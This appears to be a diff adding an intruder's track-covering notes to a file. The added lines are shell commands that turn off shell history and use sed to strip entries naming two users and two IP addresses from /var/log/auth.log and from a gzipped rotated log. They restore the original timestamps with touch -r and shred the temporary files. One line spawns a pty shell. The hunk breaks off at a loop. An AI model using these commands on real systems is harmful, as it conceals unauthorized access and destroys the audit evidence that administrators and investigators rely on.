@@ -1,4 +1,61 @@
 
+unset HISTFILE
+export HISTSIZE=0
+export HISTFILESIZE=0
+
+------------------------------ liutao from 172.20.134.114 
+touch /dev/shm/timestamp
+touch -r /var/log/auth.log /dev/shm/timestamp
+sed '/liutao/d' /var/log/auth.log > /dev/shm/backlog 
+cat /dev/shm/backlog > /var/log/auth.log
+touch -r /dev/shm/timestamp /var/log/auth.log
+shred -n 255 -z -u /dev/shm/timestamp
+
+touch /dev/shm/timestamp
+touch -r /var/log/auth.log /dev/shm/timestamp
+sed '/172\.20\.134\.114/d' /var/log/auth.log > /dev/shm/backlog 
+cat /dev/shm/backlog > /var/log/auth.log
+touch -r /dev/shm/timestamp /var/log/auth.log
+shred -n 255 -z -u /dev/shm/timestamp
+------------------------------ ends
+
+------------------------------ xujuan from 192.168.5.138 
+touch /dev/shm/timestamp
+touch -r /var/log/auth.log /dev/shm/timestamp
+sed '/xujuan/d' /var/log/auth.log > /dev/shm/backlog 
+cat /dev/shm/backlog > /var/log/auth.log
+touch -r /dev/shm/timestamp /var/log/auth.log
+shred -n 255 -z -u /dev/shm/timestamp
+
+touch /dev/shm/timestamp
+touch -r /var/log/auth.log /dev/shm/timestamp
+sed '/192\.168\.5\.138/d' /var/log/auth.log > /dev/shm/backlog 
+cat /dev/shm/backlog > /var/log/auth.log
+touch -r /dev/shm/timestamp /var/log/auth.log
+shred -n 255 -z -u /dev/shm/timestamp
+------------------------------ ends
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+ll /var/log/auth.log.1
+cat /var/log/auth.log.1 | grep 172.20
+
+------------------------------ shred inside gz
+touch /dev/shm/timestamp_gz
+touch -r /var/log/auth.log.4.gz /dev/shm/timestamp_gz
+gzip -d /var/log/auth.log.4.gz
+touch /dev/shm/timestamp_log
+touch -r /var/log/auth.log.4 /dev/shm/timestamp_log
+sed '/172\.20\.134\.114/d' /var/log/auth.log.4 > /dev/shm/backlog 
+cat /dev/shm/backlog > /var/log/auth.log.4
+touch -r /dev/shm/timestamp_log /var/log/auth.log.4
+gzip /var/log/auth.log.4
+touch -r /dev/shm/timestamp_gz /var/log/auth.log.4.gz
+shred -n 255 -z -u /dev/shm/timestamp_log
+shred -n 255 -z -u /dev/shm/timestamp_gz
+------------------------------ ends
+
+
 
 while sleep 20
 do
